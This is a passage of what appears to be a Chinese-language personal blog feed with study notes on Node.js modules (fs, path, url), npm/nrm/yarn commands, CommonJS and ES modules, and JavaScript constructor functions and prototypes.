  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 以utf-8形式編譯寫入1.txt文檔</span></span><br><span class="line">fs.<span class="title function_">writeFile</span>(<span class="string">&#x27;f:/files/2.txt&#x27;</span>, <span class="string">&#x27;Hello node.js&#x27;</span>, <span class="keyword">function</span>(<span class="params">err</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;文件寫入失敗：&#x27;</span>, err.<span class="property">message</span>)   <span class="comment">// 錯誤信息</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;文件寫入成功&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="path路徑模塊"><a href="#path路徑模塊" class="headerlink" title="path路徑模塊"></a>path路徑模塊</h2><ol>
<li><p>簡介：</p>
<ul>
<li><code>path</code>模塊是<code>Node.js</code>官方提供用於處理路徑的模塊</li>
</ul>
</li>
<li><p>導入<code>path</code>模塊：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="path模塊內置方法"><a href="#path模塊內置方法" class="headerlink" title="path模塊內置方法"></a>path模塊內置方法</h3><ol>
<li><p><code>path.join</code>方法：</p>
<ul>
<li><p>用來將多個路徑片段拼接成一個完整的路徑字符串</p>
</li>
<li><p>語法：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">path.<span class="title function_">join</span>([...paths])</span><br></pre></td></tr></table></figure>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> pathStr = path.<span class="title function_">join</span>(<span class="string">&#x27;/a&#x27;</span>, <span class="string">&#x27;/b/c&#x27;</span>, <span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;/d&#x27;</span>, <span class="string">&#x27;/e&#x27;</span>)      <span class="comment">// &#x27;/a/b/d/e&#x27;</span></span><br><span class="line"><span class="keyword">const</span> pathStr = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;./files/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：<font color="#f54747">凡涉及路徑拼接的操作，都要使用<code>path.join</code>方法進行處理，不要直接使用<code>+</code>進行字符串拼接</font></li>
</ul>
</li>
</ul>
</li>
<li><p><code>path.basename</code>方法：</p>
<ul>
<li><p>用來從路徑字符串中，將文件名解析出來</p>
</li>
<li><p>語法：</p>
<ol>
<li><code>path</code>參數：必選參數，表示一個路徑字符串</li>
<li><code>ext</code>參數：可選參數，表示文件擴展名</li>
<li>返回：表示路徑中最後的一個部分（文件名）  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">path.<span class="title function_">basename</span>(path, ext)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fpath = <span class="string">&#x27;/files/result.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fullName = path.<span class="title function_">basename</span>(fpath)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fullName)  <span class="comment">// result.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> nameWithoutExt = path.<span class="title function_">basename</span>(fpath, <span class="string">&#x27;.txt&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nameWithoutExt)  <span class="comment">//result</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>path.extname</code>方法：</p>
<ul>
<li><p>用於獲取路徑中的擴展名</p>
</li>
<li><p>語法：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">path.<span class="title function_">extname</span>(path)</span><br></pre></td></tr></table></figure>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fpath = <span class="string">&#x27;/files/result.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ext = path.<span class="title function_">extname</span>(fpath)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ext)  <span class="comment">// txt</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="dirname屬性"><a href="#dirname屬性" class="headerlink" title="__dirname屬性"></a>__dirname屬性</h3><ol>
<li><p>路徑動態拼接問題：</p>
<ul>
<li>在使用<code>fs</code>模塊操作文件時，如果提供的操作路徑時以<code>./</code>或者<code>../</code>開頭的相對路徑時，很容易出現路徑動態拼接錯誤問題  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./files/1.txt</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>原因：</p>
<ul>
<li>代碼運行時，會以<font color="#f54747">執行<code>node</code>命令所在的目錄</font>，動態拼接出被操作文件的完整路徑</li>
</ul>
</li>
<li><p>解決方案：</p>
<ol>
<li><p>直接提供一個完整的文件存放路徑</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/Users/donald/Weekly\Tasks/NodeJS/01.Node基礎/files/1.txt</span><br></pre></td></tr></table></figure>
<ul>
<li>問題：<font color="#f54747">移植性非常差，不利於維護</font></li>
</ul>
</li>
<li><p><code>__dirname</code>屬性：表示當前文件所處的目錄</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">__dirname + <span class="string">&#x27;/files/1.txt&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="url模塊"><a href="#url模塊" class="headerlink" title="url模塊"></a>url模塊</h2><ol>
<li><p>解析路徑：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> myURL = <span class="keyword">new</span> <span class="title function_">URL</span>(req.<span class="property">url</span>, <span class="string">&#x27;https://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure>

</li>
<li><p>提取路徑名：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">myURL.<span class="property">pathname</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>路徑參數：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">myURL.<span class="property">searchParams</span>  <span class="comment">// &#123; &#x27;a&#x27; =&gt; &#x27;1&#x27;, &#x27;name&#x27; =&gt; &#x27;Donald&#x27; &#125;</span></span><br><span class="line"><span class="comment">// 提取參數名與值</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> [key,value] <span class="keyword">of</span> myURL.<span class="property">searchParams</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(key, value)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p>拼接路徑：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;five&#x27;</span>, <span class="string">&#x27;http://example.com/one/two/three/four&#x27;</span>)</span><br></pre></td></tr></table></figure>

</li>
<li><p><code>format</code>方法：</p>
<ul>
<li><p>改變路徑的顯示樣式</p>
</li>
<li><p>配置項：</p>
<ol>
<li><code>auth</code>：<code>true</code>為序列化網址字符串應包含用戶名和密碼 (<code>a:bcd</code>) ，默認值<code>true</code>（代表顯示）</li>
<li><code>fragment</code>：<code>true</code>為序列化網址字符串應包含片段 (<code>#foo</code>)，默認值<code>true</code>（代表顯示）</li>
<li><code>search</code>：<code>true</code>為序列化網址字符串應包含搜索查詢 (<code>?abc</code>)，默認值<code>true</code>（代表顯示）</li>
<li><code>unicode</code>：<code>true</code>為<code>Unicode</code>字符串會直接編碼，而不是<code>Punycode</code>編碼，默認值<code>false</code>（<code>Unicode</code>編譯）</li>
</ol>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> myURL = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;https://a:b@測試?abc#foo&#x27;</span>)        </span><br><span class="line">url.<span class="title function_">format</span>(myURL, &#123;</span><br><span class="line">    <span class="attr">auth</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">fragment</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">search</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">unicode</span>: <span class="literal">true</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// myURL = https://測試/</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>Web BackEnd</category>
      </categories>
      <tags>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title>NodeJS - Basic</title>
    <url>/myBlog/2022/06/28/2022/BackEnd/2022-6-28-NodeJS-Basic/</url>
    <content><![CDATA[<h2 id="NodeJS簡介"><a href="#NodeJS簡介" class="headerlink" title="NodeJS簡介"></a>NodeJS簡介</h2><ol>
<li><p>NodeJS簡介：</p>
<ul>
<li>NodeJS 是一個 JavaScript 運行環境，讓 JavaScript 可以開發後端程序，實現幾乎其他後端語言實現的所有功能，可以與 PHP、Java、Python 等後端語言平起平坐</li>
<li>NodeJS 是基於 V8 引擎，而 V8 是 Google 發布的開源 JavaScript 引擎</li>
</ul>
</li>
<li><p>NodeJS特性：</p>
<ul>
<li>NodeJS 語法完全是 JS 語法</li>
<li>NodeJS 超強的高並能力，實現高性能服務器</li>
<li>開發週期短、開發成本低、學習成本低</li>
</ul>
</li>
<li><p>NodeJS注意：</p>
<ul>
<li>瀏覽器是 JavaScript 的前端運行環境</li>
<li>Node.js 是 JavaScript 的後端運行環境</li>
<li>Node.js 中無法調用 DOM 和 BOM 等瀏覽器內置 API</li>
</ul>
</li>
<li><p>NodeJS學習路徑：<br> JavaScript 基礎語法 + Node.js 內置 API 模塊(<code>fs</code>, <code>path</code>, <code>http</code>) + 第三方 API 模塊(<code>express</code>, <code>mysql</code>)</p>
</li>
</ol>
<h2 id="Npm"><a href="#Npm" class="headerlink" title="Npm"></a>Npm</h2><ol>
<li><p>基本指令：</p>
<table>
<thead>
<tr>
<th align="center">指令</th>
<th align="center">說明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>npm init</code></td>
<td align="center">開始新項目，初始化紀錄文件</td>
</tr>
<tr>
<td align="center"><code>npm i</code></td>
<td align="center">安裝項目的全部依賴</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>npm install -g &quot;packageName&quot;</code></td>
<td align="center">安裝（<code>-g</code>表示全局操作）</td>
</tr>
<tr>
<td align="center"><code>npm uninstall -g &quot;packageName&quot;</code></td>
<td align="center">卸載</td>
</tr>
<tr>
<td align="center"><code>npm update -g &quot;packageName&quot;</code></td>
<td align="center">更新</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>npm list -g</code></td>
<td align="center">列舉安裝包（不加<code>-g</code>列舉當前目錄下的安裝包）</td>
</tr>
<tr>
<td align="center"><code>npm info &quot;packageName&quot;</code></td>
<td align="center">查看安裝包的詳細信息</td>
</tr>
<tr>
<td align="center"><code>npm install &quot;packageName&quot;@&quot;version&quot;</code></td>
<td align="center">安裝指定版本</td>
</tr>
<tr>
<td align="center"><code>npm outdated</code></td>
<td align="center">檢查安裝包是否過時</td>
</tr>
</tbody></table>
</li>
<li><p><code>package.json</code>文件紀錄：</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;md5&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.1.0&quot;</span>     <span class="comment">// ^ 表示如果直接 npm install 將會安裝 md5 2.* 版本</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;md5&quot;</span><span class="punctuation">:</span> <span class="string">&quot;~2.1.0&quot;</span>     <span class="comment">// ~ 表示如果直接 npm install 將會安裝 md5 2.1.* 版本</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;md5&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span>          <span class="comment">// * 表示如果直接 npm install 將會安裝 md5 最新版本</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="nodemon"><a href="#nodemon" class="headerlink" title="nodemon"></a>nodemon</h2><ol>
<li><p>作用：</p>
<ul>
<li>每次修改服務器腳本文件都會重新啟動服務器</li>
</ul>
</li>
<li><p>安裝：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo npm install -g nodemon</span><br></pre></td></tr></table></figure>

</li>
<li><p>使用：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nodemon <span class="string">&#x27;file&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Nrm"><a href="#Nrm" class="headerlink" title="Nrm"></a>Nrm</h2><ol>
<li><p>簡介：</p>
<ul>
<li>NRM (npm registry manager) 是<code>npm</code>的鏡像源管理工具，可以加速在<code>npm</code>源間切換</li>
</ul>
</li>
<li><p>基本指令：</p>
<table>
<thead>
<tr>
<th align="center">指令</th>
<th align="center">說明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>npm install -g nrm</code></td>
<td align="center">安裝<code>nrm</code></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>nrm ls</code></td>
<td align="center">查看可選源，其中帶有<code>*</code>的是當前使用的源</td>
</tr>
<tr>
<td align="center"><code>npm config get registry</code></td>
<td align="center">查看使用中的<code>nrm</code></td>
</tr>
<tr>
<td align="center"><code>npm config set registry &quot;url&quot;</code></td>
<td align="center">手動切換鏡像</td>
</tr>
<tr>
<td align="center"><code>nrm use &quot;xxx&quot;</code></td>
<td align="center">切換<code>nrm</code>：切換到xxx源</td>
</tr>
<tr>
<td align="center"><code>nrm test</code></td>
<td align="center">測試速度</td>
</tr>
</tbody></table>
</li>
</ol>
<h2 id="Yarn"><a href="#Yarn" class="headerlink" title="Yarn"></a>Yarn</h2><ol>
<li><p>簡介：</p>
<ul>
<li>速度超快：Yarn 緩存了每個下載過的包，所以在此使用時無需重複下載。同時利用並行下載以最大化資源利用率，因此安裝速度更快</li>
<li>超級安全：在執行代碼前，Yarn 會通過算法校驗每個安裝包的完整性</li>
</ul>
</li>
<li><p>基本指令：</p>
<table>
<thead>
<tr>
<th align="center">指令</th>
<th align="center">說明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>npm i -g yarn</code></td>
<td align="center">安裝<code>yarn</code></td>
</tr>
<tr>
<td align="center"><code>yarn init</code></td>
<td align="center">開始新項目，初始化紀錄文件</td>
</tr>
<tr>
<td align="center"><code>yarn install</code></td>
<td align="center">安裝項目的全部依賴</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>yarn add &quot;packageName&quot;</code></td>
<td align="center">添加依賴包</td>
</tr>
<tr>
<td align="center"><code>yarn add &quot;packageName&quot;@&#39;version&#39;</code></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>yarn add &quot;packageName&quot;--dev</code></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>yarn upgrade &quot;packageName&quot;@&#39;version&#39;</code></td>
<td align="center">升級依賴包</td>
</tr>
<tr>
<td align="center"><code>yarn remove &quot;packageName&quot;</code></td>
<td align="center">移除依賴包</td>
</tr>
</tbody></table>
</li>
</ol>
<h2 id="CommonJS規範"><a href="#CommonJS規範" class="headerlink" title="CommonJS規範"></a>CommonJS規範</h2><ol>
<li><p>介紹：</p>
<ul>
<li>將公共的功能抽離成為一個單獨的<code>js</code>文件呢作為一個模塊化，默認情況下面這個模塊裡面的方法或屬性，外面是無法訪問的。</li>
<li>如果要讓外部可以訪問模塊裡面的方法或屬性，就必須在模塊裡通過<code>exports</code>或者<code>module.exports</code>暴露</li>
</ul>
</li>
<li><p>接口暴露：</p>
<ol>
<li><p>通過<code>exports</code>暴露：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    sayName     <span class="comment">// sayName:sayName</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>通過<code>module.exports</code>暴露：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">say</span> = sayName</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>引入接口：</p>
<ul>
<li>使用<code>require</code>方法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> moudleFile = <span class="built_in">require</span>(<span class="string">&#x27;./path&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="模塊化編程"><a href="#模塊化編程" class="headerlink" title="模塊化編程"></a>模塊化編程</h2><ol>
<li><p>傳統JS代碼問題：</p>
<ol>
<li>命名空間：當引入多個擁有重名的函數，則後引入的 JS 文件會將其覆蓋</li>
<li>依賴關係：當一個 JS 要調用其他文件中的函數，則該文件需要在此文件前引入</li>
<li>暴露問題：JS 文件中的方法是全局方法，因此需要安裝其他插件去閉包保護</li>
</ol>
</li>
<li><p>模塊化編程：</p>
<ul>
<li>利用暴露接口和引入的方式解決傳統 JS 代碼問題</li>
</ul>
</li>
</ol>
<h3 id="ES模塊化開發"><a href="#ES模塊化開發" class="headerlink" title="ES模塊化開發"></a>ES模塊化開發</h3><ol>
<li><p>切換<code>commitJS</code>模塊化規範為<code>ES</code>的模塊化規範：</p>
<ol>
<li><p>創建日誌</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm init</span><br></pre></td></tr></table></figure>
</li>
<li><p>日誌中添加<code>type</code>屬性並修改為<code>module</code>：</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;module&quot;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>暴露接口：</p>
<ol>
<li><p>通過<code>export default</code>暴露：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> moduleA</span><br></pre></td></tr></table></figure>
</li>
<li><p>通過<code>export</code>對象暴露：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">    moduleA,</span><br><span class="line">    moduleB,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>引入接口：</p>
<ul>
<li>通過<code>import ... from</code>方法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> moduleA <span class="keyword">from</span> <span class="string">&#x27;./path&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; moduleA,moduleB &#125; <span class="keyword">from</span> <span class="string">&#x27;./path&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>注意：<font color="#f54747">一旦修改為使用<code>ES</code>模塊規範，則不能使用<code>commitJS</code>的模塊規範語句</font></p>
</li>
</ol>
]]></content>
      <categories>
        <category>Web BackEnd</category>
      </categories>
      <tags>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript - Construct Function</title>
    <url>/myBlog/2022/07/11/2022/FrontEnd/2022-7-11-JS-ConstructFunction/</url>
    <content><![CDATA[<h2 id="構造函數"><a href="#構造函數" class="headerlink" title="構造函數"></a>構造函數</h2><ol>
<li>簡介：<ul>
<li>由於在ES6之前，JS中並沒有引入類的概念，<br>  因此ES6之前的對象不是基於類創建的，而是用一種稱為構造函數的特殊函數來定義對象和他的特徵</li>
</ul>
</li>
</ol>
<h3 id="構造函數的使用"><a href="#構造函數的使用" class="headerlink" title="構造函數的使用"></a>構造函數的使用</h3><ol>
<li><p>利用構造函數創建對象：</p>
<ul>
<li>語法規範：<font color="#f54747">首字母大寫</font></li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">uname, age</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">uname</span> = uname</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">eat</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I am eating&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>創建實例對象：</p>
<ul>
<li>使用<code>new</code>關鍵字創造實例對象</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> donald = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;Donald&#x27;</span>, <span class="number">19</span>)</span><br></pre></td></tr></table></figure></li>
<li>運行模式：<ol>
<li>在內存中創建一個新的空對象</li>
<li>讓 this 指向這個新對象</li>
<li>執行構造函數裡面的代碼，給這個新對象添加屬性和方法</li>
<li>返回這個新對象 (因此構造函數裡面不需要return)</li>
</ol>
</li>
</ul>
</li>
</ol>
<h3 id="構造函數的成員"><a href="#構造函數的成員" class="headerlink" title="構造函數的成員"></a>構造函數的成員</h3><ol>
<li><p>實例成員：</p>
<ul>
<li>實例成員就是構造函數內部通過 this 添加的成員</li>
<li>實例成員只能通過<font color="#f54747">實例化的對象</font>來訪問</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">uname, age</span>)&#123;</span><br><span class="line">    <span class="comment">// 創建實例成員</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">uname</span> = uname</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> donald = <span class="title class_">Person</span>(<span class="string">&#x27;Donald&#x27;</span>, <span class="number">18</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 訪問實例成員</span></span><br><span class="line">donald.<span class="property">uname</span>    <span class="comment">// Donald</span></span><br><span class="line"><span class="comment">// 並不能通過構造函數訪問實例成員</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property">uname</span>    <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>靜態成員：</p>
<ul>
<li>靜態成員就是在構造函數身上添加的成員</li>
<li>靜態成員只能通過<font color="#f54747">構造函數</font>來訪問</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 創建靜態成員</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property">gender</span> = <span class="string">&#x27;Male&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 靜態成員只能通過構造函數訪問</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property">gender</span>);     <span class="comment">// Male</span></span><br><span class="line"><span class="comment">// 不可以通過實例對象來訪問</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(donald.<span class="property">gender</span>);     <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="構造函數的問題"><a href="#構造函數的問題" class="headerlink" title="構造函數的問題"></a>構造函數的問題</h3><ul>
<li>浪費內存：例如對象身上的函數，每當創造一個實例對象，都會給每一個實例創建對象身上的函數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 他們比較的是地址，可見兩個函數是存放在不同的地址</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(donald.<span class="property">eat</span> === john.<span class="property">eat</span>);  <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h2><ol>
<li>簡介：<ul>
<li>解決構造函數浪費內存的問題，構造函數通過原型分配的函數是所有對象<font color="#f54747">共享</font>的</li>
</ul>
</li>
</ol>
<h3 id="原型對象"><a href="#原型對象" class="headerlink" title="原型對象"></a>原型對象</h3><ol>
<li><p>原型對象Prototype</p>
<ul>
<li>JS規定，<font color="#f54747">每一個構造函數都有一個<code>prototype</code>屬性</font>，指向另一個對象<br>  注意：這個<code>prototype</code>是一個對象，這個對象的所有方法和屬性，都會被構造函數所擁有</li>
<li>我們可以把不變的方法，直接定義在<code>prototype</code>對象上，這樣所有對象的實例就可以共享這些方法</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">eat</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I am eating&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 事例對象共享方法</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;?&#x27;</span>, donald.<span class="property">eat</span> === john.<span class="property">eat</span>)   <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li>
<li><font color="#f54747">一般情況下，公共屬性會定義到構造函數裡，而公共方法則會放在原型對象身上</font></li>
</ul>
</li>
<li><p>原型對象中this的指向</p>
<ul>
<li>原型對象函數裡的this指向的是實例對象</li>
</ul>
</li>
</ol>
<h3 id="對象的原型"><a href="#對象的原型" class="headerlink" title="對象的原型"></a>對象的原型</h3><ol>
<li><p>對象原型<code>__proto__</code></p>
<ul>
<li>每個實例對象身上系統都會添加一個<code>__proto__</code>指向構造函數的原型對象<code>prototype</code></li>
<li>實例對象上的原型<code>__proto__</code>與構造函數身上的原型對象<code>prototype</code>是同等的  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(donald.<span class="property">__proto__</span> === <span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>);     <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li>
<li><code>__proto__</code>對象原型的意義在於為對象的查找機制提供一個方向，但他是一個<font color="#f54747">非標準屬性</font><br>  因此在實際開發中，不可以使用這個屬性，他只是內部指向原型對象<code>prototype</code></li>
</ul>
</li>
<li><p>方法的查找規則：</p>
<ol>
<li>首先先查找實例對象上是否有對應的方法，如果有則執行對象上的方法</li>
<li>如果沒有，因為有<code>__proto__</code>的存在，就會去構造函數原型對象<code>prototype</code>身上去查找該方法</li>
</ol>
</li>
</ol>
<h3 id="原型的構造器"><a href="#原型的構造器" class="headerlink" title="原型的構造器"></a>原型的構造器</h3><ol>
<li>原型構造器<code>constructor</code><ul>
<li>對象原型<code>__proto__</code>和構造函數的原型對象<code>prototype</code>裡面都有一個<code>constructor</code>屬性</li>
<li>添加進原型對象中的函數可以用對象的簡寫形式：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">    <span class="attr">eat</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I am eating&#x27;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 函數的簡寫形式</span></span><br><span class="line">    <span class="title function_">say</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>但如果給原型對象賦值的是一個對象，則必須手動利用<code>constructor</code>指回原來的構造函數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">    <span class="attr">constructor</span>: <span class="title class_">Person</span>,    <span class="comment">// 手動指回原來的構造函數</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="原型鏈"><a href="#原型鏈" class="headerlink" title="原型鏈"></a>原型鏈</h3><ol>
<li><p>原型鏈：</p>
<ul>
<li>只要是對象，那麼就有<code>__proto__</code>原型，指向原型對象</li>
<li>例如：<br>  <code>donald</code>實例的原型指向<code>Person</code>的原型對象，<br>  <code>Person</code>原型對象的原型指向<code>Object</code>的原型對象，<br>  <code>Object</code>原型對象的原型最終指向<code>null</code></li>
<li>圖示：  <img src="https://p.ipic.vip/rnky2v.png" width="800px"/></li>
</ul>
</li>
